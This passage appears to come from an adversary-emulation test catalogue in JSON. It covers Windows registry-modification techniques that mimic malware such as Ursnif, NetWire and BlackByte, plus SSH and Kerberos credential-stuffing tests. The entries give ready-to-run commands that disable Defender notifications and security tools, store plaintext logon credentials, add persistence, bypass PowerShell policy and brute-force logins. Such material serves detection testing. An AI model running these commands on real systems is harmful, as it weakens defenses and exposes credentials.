Safe Mode with networking.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Ursnif Malware Registry Key Creation", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Terminal Server Client Connection History Cleared", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Suppress Win Defender Notifications", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "NetWire RAT Registry Key Creation", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Modify registry to store logon credentials", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl", "clacwm24400kh29mqepe96nfj"], "tags": []}, {"data": {"name": "Modify Registry of Local Machine - cmd", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | new_executable | New executable to run on startup instead of Windows Defender | String | calc.exe | "}, "executionSteps": [{"description": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl", "clacwm24400kh29mqepe96nfj"], "tags": []}, {"data": {"name": "Modify Registry of Current User Profile - cmd", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl", "clacwm24400kh29mqepe96nfj"], "tags": []}, {"data": {"name": "Javascript in registry", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl", "clacwm24400kh29mqepe96nfj"], "tags": []}, {"data": {"name": "Hide Windows Clock Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "DisallowRun Execution Of Certain Application", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Toast Notifications", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Task Manager application", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Shutdown Button", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Security Center Notifications", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Registry Tool", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Notification Center", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows LogOff Button", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Lock Workstation Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Error Reporting Settings", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows CMD application", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Disable Windows Change Password Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Change Powershell Execution Policy to Bypass", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | default_execution_policy | Specify the default poweshell execution policy | String | Default | "}, "executionSteps": [{"description": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl", "clacwm24400kh29mqepe96nfj"], "tags": []}, {"data": {"name": "BlackByte Ransomware Registry Changes - Powershell", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "BlackByte Ransomware Registry Changes - CMD", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Allow RDP Remote Assistance Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Add domain to Trusted sites Zone", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | bad_domain | Domain to add to trusted site zone | String | bad-domain.com | "}, "executionSteps": [{"description": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl", "clacwm24400kh29mqepe96nfj"], "tags": []}, {"data": {"name": "Activate Windows NoTrayContextMenu Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoSetTaskbar Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoRun Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoPropertiesMyDocuments Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 \n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoFind Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoFileMenu Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoDesktop Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoControlPanel Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Activate Windows NoClose Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "SSH Credential Stuffing From MacOS", "shortName": "T1110.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Using username,password combination from a password dump to login over SSH.\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_host | IP Address / Hostname you want to target. | String | localhost | "}, "executionSteps": [{"description": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n", "successCriteria": null}], "techniqueIds": ["clacwm6ih03is29mq6ya20wt9"], "tags": []}, {"data": {"name": "SSH Credential Stuffing From Linux", "shortName": "T1110.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Using username,password combination from a password dump to login over SSH.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_host | IP Address / Hostname you want to target. | String | localhost | "}, "executionSteps": [{"description": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n", "successCriteria": null}], "techniqueIds": ["clacwm6ih03is29mq6ya20wt9"], "tags": []}, {"data": {"name": "Brute Force:Credential Stuffing using Kerbrute Tool", "shortName": "T1110.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domaincontroller | Domain controller where test will be run | String | $ENV:userdnsdomain | \n | domain | Domain where you will be testing | String | $ENV:userdomain | "}, "executionSteps": [{"description": "cd $env:temp\n.\\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} $env:temp\\bruteforce.txt      \n", "successCriteria": null}], "techniqueIds": 